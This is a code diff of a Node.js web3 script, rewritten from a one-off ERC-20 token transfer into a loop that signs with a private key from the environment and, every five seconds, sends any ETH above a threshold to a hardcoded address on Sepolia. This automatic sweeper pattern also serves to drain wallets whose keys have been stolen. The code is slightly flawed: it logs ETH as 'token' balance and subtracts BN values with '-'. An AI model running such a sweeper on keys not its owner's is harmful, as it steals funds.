@@ -1,232 +1,85 @@
-require("dotenv").config();
-const { Web3 } = require("web3");
+require('dotenv').config();
+const {Web3} = require('web3');
+
+const BN = require('bn.js');
+
 
 const INFURA_PROJECT_ID = process.env.INFURA_PROJECT_ID;
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const SENDER_ADDRESS = process.env.SENDER_ADDRESS;
-const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS;
+const MY_KEY = process.env.MY_KEY;
+const RECIPIENT_ADDRESS = "0xfe31CfDf1d2777BbA22Bc84616d37c9a5587F561";//process.env.RECIPIENT_ADDRESS;
 const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
+const THRESHOLD = 500000000000000;//process.env.THRESHOLD;
 
-const web3 = new Web3(`https://sepolia.infura.io/v3/${INFURA_PROJECT_ID}`);
 // const web3 = new Web3(`https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`);
+const web3 = new Web3(`https://sepolia.infura.io/v3/${INFURA_PROJECT_ID}`);
 
-const myAccount = SENDER_ADDRESS;
-const toAccount = RECIPIENT_ADDRESS;
-const privateKey = Buffer.from(PRIVATE_KEY, 'hex');
+const account = web3.eth.accounts.privateKeyToAccount(`0x${MY_KEY}`);
+web3.eth.accounts.wallet.add(account);
+web3.eth.defaultAccount = account.address;
 
-const contractAddress = TOKEN_ADDRESS;
-const contractABI = [
-  {
-    type: 'event',
-    name: 'Approval',
-    inputs: [
-      {
-        indexed: true,
-        name: 'owner',
-        type: 'address',
-      },
-      {
-        indexed: true,
-        name: 'spender',
-        type: 'address',
-      },
-      {
-        indexed: false,
-        name: 'value',
-        type: 'uint256',
-      },
-    ],
-  },
-  {
-    type: 'event',
-    name: 'Transfer',
-    inputs: [
-      {
-        indexed: true,
-        name: 'from',
-        type: 'address',
-      },
-      {
-        indexed: true,
-        name: 'to',
-        type: 'address',
-      },
-      {
-        indexed: false,
-        name: 'value',
-        type: 'uint256',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'allowance',
-    stateMutability: 'view',
-    inputs: [
-      {
-        name: 'owner',
-        type: 'address',
-      },
-      {
-        name: 'spender',
-        type: 'address',
-      },
-    ],
-    outputs: [
-      {
-        type: 'uint256',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'approve',
-    stateMutability: 'nonpayable',
-    inputs: [
-      {
-        name: 'spender',
-        type: 'address',
-      },
-      {
-        name: 'amount',
-        type: 'uint256',
-      },
-    ],
-    outputs: [
-      {
-        type: 'bool',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'balanceOf',
-    stateMutability: 'view',
-    inputs: [
-      {
-        name: 'account',
-        type: 'address',
-      },
-    ],
-    outputs: [
-      {
-        type: 'uint256',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'decimals',
-    stateMutability: 'view',
-    inputs: [],
-    outputs: [
-      {
-        type: 'uint8',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'name',
-    stateMutability: 'view',
-    inputs: [],
-    outputs: [
-      {
-        type: 'string',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'symbol',
-    stateMutability: 'view',
-    inputs: [],
-    outputs: [
-      {
-        type: 'string',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'totalSupply',
-    stateMutability: 'view',
-    inputs: [],
-    outputs: [
-      {
-        type: 'uint256',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'transfer',
-    stateMutability: 'nonpayable',
-    inputs: [
-      {
-        name: 'recipient',
-        type: 'address',
-      },
-      {
-        name: 'amount',
-        type: 'uint256',
-      },
-    ],
-    outputs: [
-      {
-        type: 'bool',
-      },
-    ],
-  },
-  {
-    type: 'function',
-    name: 'transferFrom',
-    stateMutability: 'nonpayable',
-    inputs: [
-      {
-        name: 'sender',
-        type: 'address',
-      },
-      {
-        name: 'recipient',
-        type: 'address',
-      },
-      {
-        name: 'amount',
-        type: 'uint256',
-      },
-    ],
-    outputs: [
-      {
-        type: 'bool',
-      },
-    ],
-  },
-]; // ABI of your token contract
+const recipientAddress = RECIPIENT_ADDRESS;
 
-const contract = new web3.eth.Contract(contractABI, contractAddress);
+async function main() {
+  try {
+    const balance = await web3.eth.getBalance(account.address);
+    console.log(`Current Balance: ${balance} WEI`);
+    console.log(`Current threshold: ${new BN(THRESHOLD)} WEI`);
+    console.log(`Current Balance: ${Web3.utils.fromWei(balance, 'ether')} ETH`);
+    if (new BN(balance).gt( new BN(THRESHOLD))) {
+      console.log('Token balance is above the threshold.');
+      const gasPrice = await web3.eth.getGasPrice();
+      // const gasLimit = 60000; // Estimate this properly for your token transfer
 
-const gasPrice = '20000000000'; // 0 Gwei
-const gasLimit = '21584';
+      const amountToSend = new BN(balance) - new BN(THRESHOLD); // Amount to send in ETH;
+      console.log(`Amount to send: ${amountToSend} WEI`);
+      const txCount = await web3.eth.getTransactionCount(account.address);
+      const tx = {
+        nonce: txCount, // + new BN(count++),
+        from: account.address,
+        to: RECIPIENT_ADDRESS,
+        value: amountToSend,
+        // gas: gasLimit,
+        // gasPrice: gasPrice,
+      };
 
-async function sendToken() {
-    const tokenBalance = await contract.methods.balanceOf(myAccount).call();
-    if (parseInt(tokenBalance) > 30000) {
-        const data = contract.methods.transfer(toAccount, '30000').encodeABI();
-        const tx = {
-            from: myAccount,
-            to: contractAddress,
-            // gas: gasLimit,
-            // gasPrice: gasPrice,
-            data: data
-        };
+      const gasLimit = await web3.eth.estimateGas(tx);
+      console.log(gasLimit);
+      // Check ETH balance for gas fee
+      const ethBalance = await web3.eth.getBalance(account.address);
+      const estimatedGasFee = new BN(gasPrice).mul(new BN(gasLimit));
+      console.log(estimatedGasFee);
 
-        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
-        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-        console.log(`Transaction hash: ${receipt.transactionHash}`);
+      if (new BN(ethBalance).lt(estimatedGasFee)) {
+        console.log('Not enough ETH for gas fee.');
+        setTimeout(function () {
+          main();
+        }, 5000);
+        return;
+      }
+
+      tx.gas = gasLimit;
+      tx.gasPrice = gasPrice;
+
+      const signedTx = await web3.eth.accounts.signTransaction(tx, MY_KEY);
+      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+      console.log('Transaction hash:', receipt.transactionHash);
+      console.log('Transfer complete');
+      main();
+
     } else {
-        console.log('Not enough tokens to send');
+      console.log('Token balance is below the threshold.');
+      setTimeout(function () {
+        main();
+      }, 5000);
     }
+
+  } catch (error) {
+    console.error('Error:', error);
+    setTimeout(function () {
+      main();
+    }, 5000);
+  }
 }
 
-sendToken().catch(console.error);
+main();
